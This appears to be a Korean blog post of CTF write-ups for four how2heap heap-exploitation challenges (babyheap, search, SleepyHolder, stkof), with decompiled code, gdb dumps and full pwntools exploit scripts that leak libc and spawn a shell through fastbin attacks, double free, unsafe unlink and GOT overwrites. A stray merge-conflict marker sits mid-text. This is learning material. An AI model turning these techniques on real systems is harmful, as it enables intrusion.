---
title: How2Heap Prob
date: 2019-02-19
---

How2Heap 에서 추천하는 문제들을 풀고 있는데 (귀찮아서 안하고 있음 사실..) HITCON Training 처럼 지속적으로 업데이트 예정이다! 

# 0ctfbabyheap

how2heap 분류에는 fastbin_dup_into_stack이라 되어 있는데 그냥 fastbin attack 인 것 같다. stack 익스할 건덕지가 안보임..

```c
void __fastcall sub_D48(__int64 a1)
{
  signed int i; // [rsp+10h] [rbp-10h]
  signed int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = select_number();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
}
```

calloc 을 사용하고 특이한건 할당한 chunk에 대한 정보를 버퍼링 함수 안에서 따로 mmap으로 매핑하여 거기서 등록하고 사용한다. 

```c
__int64 __fastcall input_data_chunk(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = select_number();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (signed int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = select_number();
      v3 = result;
      if ( (signed int)result > 0 )
      {
        printf("Content: ");
        result = read_(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```

할당한 chunk에 데이터를 넣을 수 있는데 일단 오버플로우가 나고 매핑된 영역에 flag가 없으면 사용할 수 없다.

```c
signed int __fastcall print_chunk(__int64 a1)
{
  signed int result; // eax
  signed int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = select_number();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(_DWORD *)(24LL * result + a1);
    if ( result == 1 )
    {
      puts("Content: ");
      print_sub(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
      result = puts(byte_14F1);
    }
  }
  return result;
}
```

free는 기본적이라 생략하고 이녀석도 역시 mapped된 영역의 정보를 가지고 출력을 해준다. 주소+할당할 때 size만큼 write로 출력한다. 

익스자체는 간단한데 문제는 leak이다. free시에 chunk 포인터가 비워지기 때문에 간단하게는 leak을 할 수가 없다. 할당되는 포인터를 free된 small bin chunk를 가리키도록 해야 한다.

```c
add(0xf0)
add(0x10)
add(0xf0)
add(0x20)

gdb-peda$ par
addr                prev                size                 status              fd                bk                
0x55d233da8000      0x0                 0x100                Used                None              None
0x55d233da8100      0x0                 0x20                 Used                None              None
0x55d233da8120      0x0                 0x100                Used                None              None
0x55d233da8220      0x0                 0x30                 Used                None              None
```

일단 이런식으로 할당을 해보자

```c
gdb-peda$ 
0x155f6bff2100:	0x0000000000000001	0x00000000000000f0
0x155f6bff2110:	0x000055d233da8010	0x0000000000000001
0x155f6bff2120:	0x0000000000000010	0x000055d233da8110
0x155f6bff2130:	0x0000000000000001	0x00000000000000f0
0x155f6bff2140:	0x000055d233da8130	0x0000000000000001
0x155f6bff2150:	0x0000000000000020	0x000055d233da8230
```

포인터가 설정되어있는데 1 chunk 는 110 을 할당받은 상태다

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk                
0x5596e0b4d000      0x0                 0x100                Freed     0x7f84f4db9b78    0x7f84f4db9b78
0x5596e0b4d100      0x100               0x20                 Used                None              None
0x5596e0b4d120      0x0                 0x100                Used                None              None
0x5596e0b4d220      0x0                 0x30                 Used                None              None

0x41b30777d2a0:	0x0000000000000001	0x0000000000000010
0x41b30777d2b0:	0x00005596e0b4d110	0x0000000000000000
0x41b30777d2c0:	0x0000000000000000	0x0000000000000000
0x41b30777d2d0:	0x0000000000000001	0x00000000000000f0
0x41b30777d2e0:	0x00005596e0b4d130	0x0000000000000001
0x41b30777d2f0:	0x0000000000000020	0x00005596e0b4d230
```

free(1) -> free(0) -> add(0x10) 중간에 더미 fast chunk먼저 해제 하고 small bin 해제 후 다시 fast chunk를 재할당 해보자 0 chunk 가 fast chunk를 반환받았다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk                
0x55cb39176000      0x0                 0x220                Freed     0x7f39f36e6b78    0x7f39f36e6b78
0x55cb39176220      0x220               0x30                 Used                None              None
```

그리고 fill 메뉴로 0 chunk 에서 오버플로우를 내 2 chunk 의 prev size와 size를 변조한 후 2 chunk를 free하면 chunk가 병합되게 된다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk                
0x55aea9d94000      0x0                 0x100                Used                None              None
0x55aea9d94100      0x0                 0x120                Freed     0x7f6e92846b78    0x7f6e92846b78
0x55aea9d94220      0x120               0x30                 Used                None              None

gdb-peda$ 
0x32f2de63c100:	0x0000000000000000	0x0000000000000000
0x32f2de63c110:	0x0000000000000000	0x0000000000000000
0x32f2de63c120:	0x0000000000000000	0x0000000000000000
0x32f2de63c130:	0x0000000000000000	0x0000000000000000
0x32f2de63c140:	0x0000000000000000	0x0000000000000000
0x32f2de63c150:	0x0000000000000000	0x0000000000000000
0x32f2de63c160:	0x0000000000000001	0x0000000000000010
0x32f2de63c170:	0x000055aea9d94110	0x0000000000000001
0x32f2de63c180:	0x00000000000000f0	0x000055aea9d94010
0x32f2de63c190:	0x0000000000000000	0x0000000000000000
0x32f2de63c1a0:	0x0000000000000000	0x0000000000000001
0x32f2de63c1b0:	0x0000000000000020	0x000055aea9d94230
```

그리고 0xf0 만큼 다시 할당하면 포인터 아다리가 잘 맞게 된다. 0 chunk와 1 chunk가 바뀌었지만 0 chunk에 main.arena.top이 있기에 dump(0)을 해주면 leak이 가능하다.

```python
from pwn import *

t = process('./0ctfbabyheap')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def add(a):
	r("Command: ")
	s("1")
	r("Size: ")
	s(str(a))

def fill(a,b,c):
	r("Command: ")
	s("2")
	r("Index: ")
	s(str(a))
	r("Size: ")
	s(str(b))
	r("Content: ")
	s(str(c))

def free(a):
	r("Command: ")
	s("3")
	r("Index: ")
	s(str(a))

def dump(a):
	r("Command: ")
	s("4")
	r("Index: ")
	s(str(a))

add(0xf0)
add(0x10)
add(0xf0)
add(0x20)
free(1)
free(0)
add(0x10)
fill(0,0x20,p64(0)*2 + p64(0x120) + p64(0x100))
free(2)
add(0xf0)
dump(0)
r("Content: \n")
libc = u64(t.recv(6).ljust(8,'\x00')) - 0x3c4b78
log.info("libc ==> " + hex(libc))
one = libc + 0x4526a
malloc_hook = libc + 0x3c4b10

add(0x110)
add(0x60) #4
add(0x60) #5

free(5)
free(4)
add(0x60)
fill(4,0x78,"\x00"*0x68 + p64(0x71) + p64(malloc_hook-35))
add(0x60)
add(0x60)
fill(6,35,"\x00"*3 + p64(one)*4)

r("Command: ")
s(1)
r("Size: ")
s(10)
pause()

t.interactive()
->
bskim@bstime:~$ python babyheap2.py 
[+] Starting local process './0ctfbabyheap': pid 8663
[*] libc ==> 0x7fb39d994000
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ id
uid=1000(bskim) gid=1000(bskim)
```

leak만 되면 다음은 기본 fastbin attack이다. 

<br>

# 9447-Search

하 리버싱이 너무 딸려서 갱장히 어려웠다..

2가지 메뉴 밖에 없다. 단어 찾기, 단어 넣기 (글자?)

```c
void sub_400AD0()
{
  int v0; // ebp
  void *v1; // r12
  __int64 i; // rbx
  char v3; // [rsp+0h] [rbp-38h]

  puts("Enter the word size:");
  v0 = input_num();
  if ( (unsigned int)(v0 - 1) > 0xFFFD )
    puts_exit("Invalid size");
  puts("Enter the word:");
  v1 = malloc(v0);
  fread_((__int64)v1, v0, 0);
  for ( i = qword_6020B8; i; i = *(_QWORD *)(i + 32) )
  {
    if ( **(_BYTE **)(i + 16) )
    {
      if ( *(_DWORD *)(i + 8) == v0 && !memcmp(*(const void **)i, v1, v0) )
      {
        __printf_chk(1LL, "Found %d: ", *(unsigned int *)(i + 24));
        fwrite(*(const void **)(i + 16), 1uLL, *(signed int *)(i + 24), stdout);
        putchar(10);
        puts("Delete this sentence (y/n)?");
        fread_((__int64)&v3, 2, 1);
        if ( v3 == 121 )
        {
          memset(*(void **)(i + 16), 0, *(signed int *)(i + 24));
          free(*(void **)(i + 16));
          puts("Deleted!");
        }
      }
    }
  }
  free(v1);
}
```

이게 단어를 찾아서 free 시켜 버린다. 더블 프리가 발생함!

```c
int sub_400C00()
{
  int v0; // eax
  __int64 v1; // rbp
  int v2; // er13
  char *v3; // r12
  signed __int64 v4; // rbx
  signed __int64 v5; // rbp
  _DWORD *v6; // rax
  int v7; // edx
  __int64 v8; // rdx
  __int64 v10; // rdx

  puts("Enter the sentence size:");
  v0 = input_num();
  v1 = (unsigned int)(v0 - 1);
  v2 = v0;
  if ( (unsigned int)v1 > 0xFFFD )
    puts_exit("Invalid size");
  puts("Enter the sentence:");
  v3 = (char *)malloc(v2);
  fread_((__int64)v3, v2, 0);
  v4 = (signed __int64)(v3 + 1);
  v5 = (signed __int64)&v3[v1 + 2];
  v6 = malloc(0x28uLL);
  v7 = 0;
  *(_QWORD *)v6 = v3;
  v6[2] = 0;
  *((_QWORD *)v6 + 2) = v3;
  v6[6] = v2;
  do
  {
    while ( *(_BYTE *)(v4 - 1) != 32 )
    {
      v6[2] = ++v7;
LABEL_4:
      if ( ++v4 == v5 )
        goto LABEL_8;
    }
    if ( v7 )
    {
      v10 = qword_6020B8;
      qword_6020B8 = (__int64)v6;
      *((_QWORD *)v6 + 4) = v10;
      v6 = malloc(0x28uLL);
      v7 = 0;
      *(_QWORD *)v6 = v4;
      v6[2] = 0;
      *((_QWORD *)v6 + 2) = v3;
      v6[6] = v2;
      goto LABEL_4;
    }
    *(_QWORD *)v6 = v4++;
  }
  while ( v4 != v5 );
LABEL_8:
  if ( v7 )
  {
    v8 = qword_6020B8;
    qword_6020B8 = (__int64)v6;
    *((_QWORD *)v6 + 4) = v8;
  }
  else
  {
    free(v6);
  }
  return puts("Added sentence");
}
```

이게 문장을 넣어 주는 건데 자세하게 분석은 못했다. 포인터들이 엄청나게 생기는데 크게 중요하지 않았다.

으.. 이건 leak 하기가 되게 어려웠다 ㅠ

분명 fwrite 를 이용해서 릭을 해야 할텐데... 출력되는 포인터는 지워지지 않기 때문에 가능하다 생각하고 계속 해봤는데 한 문자로 꽉채워서 그 문자로만 free 시켰을 때 다시 어떻게 출력해야 하는지 알 수가 없었다 ㅠㅠ 같은 size로 찾게 되면 찾는 문자가 다시 smallbin에 들어가게 돼서 매우 곤란했다...  문장을 삽입하는 코드에 0x20으로 뭔가 짜르는 것 같아서 뭔가 계속 넣어봤는데

```
bskim@bsbuntu:~/2019/how2heap$ ./search
1: Search with a word
2: Index a sentence
3: Quit
2
Enter the sentence size:
3
Enter the sentence:
a b
Added sentence
1: Search with a word
2: Index a sentence
3: Quit
1
Enter the word size:
1
Enter the word:
a
Found 3: a b

Enter the word size:
1
Enter the word:
b
Found 3: a b
```

중간에 0x20을 넣어주면 이렇게 검색이 되더라 대충 중간에 더미 문자 하나 끼워서 그걸 다시 찾으면 출력이 될것 같다. (smallbin에 다시 재할당 되지 않도록 작은 녀석이어야 한다.)

```python
from pwn import *

t = process('./search')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def sw(size,a):
	r("3: Quit")
	s("1")
	r(":")
	s(str(size))
	r(":")
	s(str(a))

def sen(size,a):
	r("3: Quit")
	s("2")
	r(":")
	s(str(size))
	r(":")
	s(str(a))

sen(0x100,"a"*0xf0 + " b " + "c"*(0x100-0xf3))

sw(1,"b")
r("?")
s("y")
sw(1,"\x00")

r("Found 256: ")
libc = u64(t.recv(6).ljust(8,'\x00')) - 0x3c4b78
log.success("libc ==> " + hex(libc))
malloc_hook = libc + 0x3c4b10
one = libc + 0xf02a4
log.success("one ==> " + hex(one))
r("?")
s("n")

sen(0x100,"a"*0x100)
sen(0x10,"y"*0x10)
sen(0x60,"d"*0x20 + " b " + "c"*(0x60-0x23))
sen(0x60,"d"*0x20 + " b " + "c"*(0x60-0x23))
sen(0x60,"d"*0x20 + " b " + "c"*(0x60-0x23))

sw(1,"b")
r("?")
s("y")
r("?")
s("y")
r("?")
s("y")

sw(1,"\x00")
r("?")
s("y")
r("?")
s("n")

sen(0x60,p64(malloc_hook-35) + "p"*(0x60-8))
sen(0x60,"a"*0x60)
sen(0x60,"a"*0x60)
sen(0x60,"a"*3 + p64(one)*4 + "c"*(0x60 - 35))

t.interactive()
```

익스 코드 

leak은 몇 시간동안 삽질하다가 겨우 되었다.. b를 지우고나서 다시 뭐로 찾아야 저게 나오나 했는데 null이었음 거의 얻어걸렸다. 그 다음 더블 프리를 만들기 위해서 같은 방법으로 free를 해줘야 한다. 마지막으로 hook 덮기

근데 이것도 스택을 왜 안쓰지 하고 찾아보니 실제 풀이들은 스택을 이용해서 풀었더라.. 기왕 찾아본 김에 스택으로도 풀어봤다.

스택 릭은 전혀 생각도 못하고 있었는데..

```c
__int64 input_num()
{
  __int64 result; // rax
  char *endptr; // [rsp+8h] [rbp-50h]
  char nptr; // [rsp+10h] [rbp-48h]
  unsigned __int64 v3; // [rsp+48h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  fread_((__int64)&nptr, 48, 1);
  result = strtol(&nptr, &endptr, 0);
  if ( endptr == &nptr )
  {
    __printf_chk(1LL, "%s is not a valid number\n", &nptr);
    result = input_num();
  }
  __readfsqword(0x28u);
  return result;
}
```

여기서 릭이 되어 버린다. 숫자가 아닌 문자를 넣으면 에러가 뜨면서 다시 이 녀석이 재 호출 되면서 새로운 스택 프레임이 생기게 된다.(48개를 꽉채우면 널바이트도 들어가지 않는다) 

```c
gdb-peda$ x/32gx 0x7ffc644e08e0 - 0x60
0x7ffc644e0880:	0x6161616161616161	0x6161616161616161
0x7ffc644e0890:	0x6161616161616161	0x6161616161616161
0x7ffc644e08a0:	0x6161616161616161	0x6161616161616161
0x7ffc644e08b0:	0x00007ffc644e08e0	0x59f979be216a5000
0x7ffc644e08c0:	0x00007ffc644e08e0	0x0000000000400abb
0x7ffc644e08d0:	0x000000000000000a	0x00007ffc644e08e0
0x7ffc644e08e0:	0x6161616161616161	0x6161616161616161
0x7ffc644e08f0:	0x6161616161616161	0x6161616161616161
0x7ffc644e0900:	0x6161616161616161	0x6161616161616161
0x7ffc644e0910:	0x0000000000000000	0x59f979be216a5000
```

왜 저 포인터가 저렇게 추가 되는지는 잘 모르겠으나.. 신기했다. 아무튼 2번의 에러를 내면 스택 릭이 된다.

```python
from pwn import *

t = process('./search')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def sw(size,a):
	r("3: Quit")
	s("1")
	r(":")
	s(str(size))
	r(":")
	s(str(a))

def sen(size,a):
	r("3: Quit")
	s("2")
	r(":")
	s(str(size))
	r(":")
	s(str(a))

r("3: Quit")
s("a"*48)
r("number")
s("a"*48)
r("a"*48)
stack = u64(t.recv(6).ljust(8,'\x00'))
log.success("stack ==> " + hex(stack))
target = stack + 0x50 # -6

r("number")
s("2")
r(":")
s(0x100)
r(":")
s("a"*0xf0 + " b " + "c"*(0x100-0xf3))

sw(1,"b")
r("?")
s("y")
sw(1,"\x00")

r("Found 256: ")
libc = u64(t.recv(6).ljust(8,'\x00')) - 0x3c4b78
log.success("libc ==> " + hex(libc))
malloc_hook = libc + 0x3c4b10
system = libc + 0x45390
prdi = 0x0000000000400e23
binsh = libc + 0x18cd57
r("?")
s("n")

sen(0x100,"a"*0x100)
sen(0x10,"y"*0x10)
sen(0x30,"d"*0x20 + " b " + "c"*(0x30-0x23))
sen(0x30,"d"*0x20 + " b " + "c"*(0x30-0x23))
sen(0x30,"d"*0x20 + " b " + "c"*(0x30-0x23))

sw(1,"b")
r("?")
s("y")
r("?")
s("y")
r("?")
s("y")

sw(1,"\x00")
r("?")
s("y")
#r("?")
#s("n")

sen(0x30,p64(target-6) + "p"*(0x30-8))
sen(0x30,"a"*0x30)
sen(0x30,"a"*0x30)
sen(0x30,"\x40" + "\x00"*5 + p64(0) + p64(prdi) + p64(binsh) + p64(system) + "c"*(0x30-38))
r("3: Quit")
s("3")
pause()

t.interactive()
```

원샷 되는게 없는 것 같다.. (아니 한달만에 문제를 풀다니..)

아ㅏㅏㅏㅏ 리버싱을 잘하고 싶다... 
<<<<<<< HEAD

<br>

# Hitcon2016 - SleepyHolder

fastbin consolidate을 이용해서 하는 문제다. 이게 뭐냐면 fast chunk를 free 해서 fastbin에 넣은 후 large chunk 를 할당하게 되면 fastbin에서 smallbin으로 삽입된다. 더블 프리 시 fast top 검증을 피할 수 있다.

이게 정확히 왜 되는지는.. 소스를 보긴 했지만 아직 잘 모르겠다.. (복잡) 

아무튼 이 문제를 보면

```c
unsigned __int64 sub_40093D()
{
  int v0; // eax
  char s; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("What secret do you want to keep?");
  puts("1. Small secret");
  puts("2. Big secret");
  if ( !huge_pointer )
    puts("3. Keep a huge secret and lock it forever");
  memset(&s, 0, 4uLL);
  read(0, &s, 4uLL);
  v0 = atoi(&s);
  if ( v0 == 2 )
  {
    if ( !big_pointer )
    {
      big_inputbuf = calloc(1uLL, 0xFA0uLL);
      big_pointer = 1;
      puts("Tell me your secret: ");
      read(0, big_inputbuf, 0xFA0uLL);
    }
  }
  else if ( v0 == 3 )
  {
    if ( !huge_pointer )
    {
      huge_inputbuf = calloc(1uLL, 0x61A80uLL);
      huge_pointer = 1;
      puts("Tell me your secret: ");
      read(0, huge_inputbuf, 0x61A80uLL);
    }
  }
  else if ( v0 == 1 && !small_pointer )
  {
    buf = calloc(1uLL, 0x28uLL);
    small_pointer = 1;
    puts("Tell me your secret: ");
    read(0, buf, 0x28uLL);
  }
  return __readfsqword(0x28u) ^ v3;
}
```

save secret

```c
unsigned __int64 sub_400B01()
{
  int v0; // eax
  char s; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Which Secret do you want to wipe?");
  puts("1. Small secret");
  puts("2. Big secret");
  memset(&s, 0, 4uLL);
  read(0, &s, 4uLL);
  v0 = atoi(&s);
  if ( v0 == 1 )
  {
    free(buf);
    small_pointer = 0;
  }
  else if ( v0 == 2 )
  {
    free(big_inputbuf);
    big_pointer = 0;
  }
  return __readfsqword(0x28u) ^ v3;
}
```

delete secret

```c
unsigned __int64 sub_400BD0()
{
  int v0; // eax
  char s; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Which Secret do you want to renew?");
  puts("1. Small secret");
  puts("2. Big secret");
  memset(&s, 0, 4uLL);
  read(0, &s, 4uLL);
  v0 = atoi(&s);
  if ( v0 == 1 )
  {
    if ( small_pointer )
    {
      puts("Tell me your secret: ");
      read(0, buf, 0x28uLL);
    }
  }
  else if ( v0 == 2 && big_pointer )
  {
    puts("Tell me your secret: ");
    read(0, big_inputbuf, 0xFA0uLL);
  }
  return __readfsqword(0x28u) ^ v3;
}
```

update secret

크게 3가지 메뉴만 있다. save secret 시에 fast chunk, small chunk, large chunk 이렇게 각각 1개 씩 만들 수 있고 delete로 free 시킬 수 있다. 하지만 chunk는 각 1개씩 밖에 못만든다.(그래도 chunk pointer는 살아 있다.)

딱 chunk 할당만 봐도 저 녀석을 이용해 fastbin attack일 거라 생각했지만 fast chunk의 크기가 0x30으로 정해져 있다. 이 사이즈로는 이 문제에서 익스할 수 있는 벡터가 존재하지 않는다.. 

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x964000            0x0                 0x2c0                Used                None              None
0x9642c0            0x0                 0x30                 Freed                0x0    0x7f12fef48b98
0x9642f0            0x30                0xfb0                Used                None              None
gdb-peda$ ar
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x9642c0 --> 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x9652a0 (size : 0x1fd60)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x030)  smallbin[ 1]: 0x9642c0 (invaild memory)
```

smallbin에 넣을 수 있지만 여기서 뭘 할 수 있는지 좀 막혀있다가

```c
0x6020c0:	0x0000000000964300	0x00007f12ff0ff010
0x6020d0:	0x00000000009642d0	0x0000000100000001
0x6020e0:	0x0000000000000000	0x0000000000000000
    
buf = calloc(1uLL, 0x28uLL);
small_pointer = 1;
puts("Tell me your secret: ");
read(0, buf, 0x28uLL);
```

이렇게 chunk pointer들이 free되도 남아있다. 또 fast chunk를 할당받을 때 small chunk의 prev_size 까지 쓰게 해주는게 보인다. 게다가 형태마저 hitcon training에서 봤던 unsafe unlink 하기 딱 좋은 형태다. unlink를 하기 위해서 fastbin consolidate가 필요한듯

```c
gdb-peda$ x/32gx 0x1c86650
0x1c86650:	0x0000000000000000	0x0000000000000031
0x1c86660:	0x0000000000000000	0x00000000000209a1
0x1c86670:	0x00000000006020b8	0x00000000006020c0
0x1c86680:	0x0000000000000020	0x0000000000000fb0
0x1c86690:	0x0000000000000061	0x0000000000000000

gdb-peda$ x/32gx 0x6020b0
0x6020b0 <stdout>:	0x00007fe2188cd620	0x0000000000000000
0x6020c0:	0x0000000001c86690	0x00007fe218a83010
0x6020d0:	0x00000000006020b8	0x0000000100000000
0x6020e0:	0x0000000000000001	0x0000000000000000
```

unlink를 해주면 이렇게 이쁘게 박힌다. 그 다음 small secret pointer에 atoi_got를 넣고 거기에 puts_plt를 넣고 메뉴 선택할 때 puts_got를 넣으려고 했는데 계속 안돼서 삽질하다보니 이게 atoi 인자로 4바이트 밖에 쓸 수가 없어서 그랬다… (갱장한 삽질이었음)

```c
gdb-peda$ x/32gx 0x6020b0
0x6020b0 <stdout>:	0x00007f69c2930620	0x0000000000000000
0x6020c0:	0x0000000000602080	0x0000000000602080
0x6020d0:	0x0000000000602018	0x0000000100000000
0x6020e0:	0x0000000000000001	0x0000000000000000

gdb-peda$ x/gx 0x0000000000602018
0x602018 <free@got.plt>:	0x0000000000400760
```

1 pointer에 free_got를 넣고 free_got에 puts_plt를 넣고 2 pointer를 free 시키면 릭 가능!

```python
from pwn import *

t = process('./sleepyholder')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def save(a,b):
	r("3. Renew secret\n")
	s("1")
	r("2. Big secret\n")
	s(str(a))
	r(": \n")
	t.send(str(b))

def de(a):
	r("3. Renew secret\n")
	s("2")
	r("2. Big secret\n")
	s(str(a))

def renew(a,b):
	r("3. Renew secret\n")
	s("3")
	r("2. Big secret\n")
	s(str(a))
	r(": \n")
	t.send(str(b))

atoi_got = 0x602080
puts_plt = 0x0000000000400760
puts_got = 0x602020
free_got = 0x602018

save(1,'a')
save(2,'a')
de(1)
save(3,'b')
de(1)

save(1,p64(0) + p64(0x21) + p64(0x6020d0 - 0x18) + p64(0x6020d0 - 0x10) + p64(0x20))
de(2)

renew(1,p64(0) + p64(atoi_got)*2 + p64(free_got))
renew(1,p64(puts_plt))
de(2)

libc = u64(t.recv(6).ljust(8,'\x00')) - 0x36e80
log.success("libc ==> " + hex(libc))
system = libc + 0x45390

renew(1,p64(system))
save(2,'sh\x00')
de(2)

t.interactive()
->
$ id
uid=1000(bskim)
```

그 후엔 똑같이 free_got를 system으로 바꾸고 atoi_got에 sh를 쓰고 2 pointer를 free 해주면 쉘 ! 또 하나의 문제점 이었던거는.. secret 입력할 때 sendline으로 보내버려서 got 덮을 때 계속 에러가 나서 거기서도 시간을 많이 버렸다..(send와 sendline은 진짜 적절하게 잘 써야 함 ㅠ) 그래도 이건 search에 비하면 훠얼씬 수월했다..(메뉴 적은게 체고시다)

<br>

# Hitcon2014-Stkof

unsafe unlink 문제 

```c
signed __int64 sub_400936()
{
  __int64 size; // [rsp+0h] [rbp-80h]
  char *v2; // [rsp+8h] [rbp-78h]
  char s; // [rsp+10h] [rbp-70h]
  unsigned __int64 v4; // [rsp+78h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  fgets(&s, 16, stdin);
  size = atoll(&s);
  v2 = (char *)malloc(size);
  if ( !v2 )
    return 0xFFFFFFFFLL;
  ::s[++chunk_count] = v2;
  printf("%d\n", (unsigned int)chunk_count, size);
  return 0LL;
}
```

malloc 

bss에 count 변수를 출력해주고 chunk pointer를 넣는다.

```c
signed __int64 sub_4009E8()
{
  signed __int64 result; // rax
  int i; // eax
  unsigned int v2; // [rsp+8h] [rbp-88h]
  __int64 n; // [rsp+10h] [rbp-80h]
  char *ptr; // [rsp+18h] [rbp-78h]
  char s; // [rsp+20h] [rbp-70h]
  unsigned __int64 v6; // [rsp+88h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  fgets(&s, 16, stdin);
  v2 = atol(&s);
  if ( v2 > 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !::s[v2] )
    return 0xFFFFFFFFLL;
  fgets(&s, 16, stdin);
  n = atoll(&s);
  ptr = ::s[v2];
  for ( i = fread(ptr, 1uLL, n, stdin); i > 0; i = fread(ptr, 1uLL, n, stdin) )
  {
    ptr += i;
    n -= i;
  }
  if ( n )
    result = 0xFFFFFFFFLL;
  else
    result = 0LL;
  return result;
}
```

복잡해보이긴 하는데 그냥 내가 원하는 만큼 할당한 chunk에 입력할 수 있다. (개꿀)

```c
signed __int64 sub_400B07()
{
  unsigned int v1; // [rsp+Ch] [rbp-74h]
  char s; // [rsp+10h] [rbp-70h]
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fgets(&s, 16, stdin);
  v1 = atol(&s);
  if ( v1 > 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !::s[v1] )
    return 0xFFFFFFFFLL;
  free(::s[v1]);
  ::s[v1] = 0LL;
  return 0LL;
}
```

free

bss의 pointer도 지워버린다. 그리고 이 문제 chunk idx는 1 부터 시작

overflow가 갱장히 편하니 바로 unlink 해주고 sleepyholder 처럼 atoi와 free를 이용해서 풀었다.

```python
from pwn import *

t = process('./stkof')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def alloc(size):
	s("1")
	s(str(size))

def input(a,b,c):
	s("2")
	s(str(a))
	#pause()
	s(str(b))
	#pause()
	s(str(c))

def fre(a):
	s("3")
	s(str(a))

def maybe_print(a):
	s("4")
	s(str(a))

atoi_got = 0x602080
puts_plt = 0x0000000000400760
puts_got = 0x602020
free_got = 0x602018

alloc(0x100) # Dummy chunk(Not setvbuf)
alloc(0x100)
alloc(0x100)

p = p64(0) + p64(0x100) + p64(0x602150-0x18) + p64(0x602150-0x10) + "a"*(0x100-0x20) + p64(0x100) + p64(0x110)

input(2,len(p),p)
fre(3)
r("OK")

p = p64(0)*3 + p64(atoi_got) + p64(free_got) + p64(atoi_got)

input(2,len(p),p)
input(3,8,p64(puts_plt))
fre(2)
r("FAIL")
r("FAIL")
r("FAIL\n")

libc = u64(t.recv(6).ljust(8,'\x00')) - 0x36ea0
log.success("libc ==> " + hex(libc))
one = libc + 0xf02a4

input(3,8,p64(one))
fre(4)

pause()

t.interactive()
```

풀고 이거 쓸 때 다시 봤는데

```c
signed __int64 sub_400BA9()
{
  unsigned int v1; // [rsp+Ch] [rbp-74h]
  char s; // [rsp+10h] [rbp-70h]
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fgets(&s, 16, stdin);
  v1 = atol(&s);
  if ( v1 > 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !::s[v1] )
    return 0xFFFFFFFFLL;
  if ( strlen(::s[v1]) <= 3 )
    puts("//TODO");
  else
    puts("...");
  return 0LL;
}
```

4번 메뉴가 별게 없어서 그냥 보고 넘어갔는데 strlen(::s[v1]) 이 부분으로 릭하고 익스가 가능해보인다. 괜히 있는건 아니었던 모양이다. 16.04 이하 버전에서 포인터 놀음은 unlink가 참 좋은 것 같음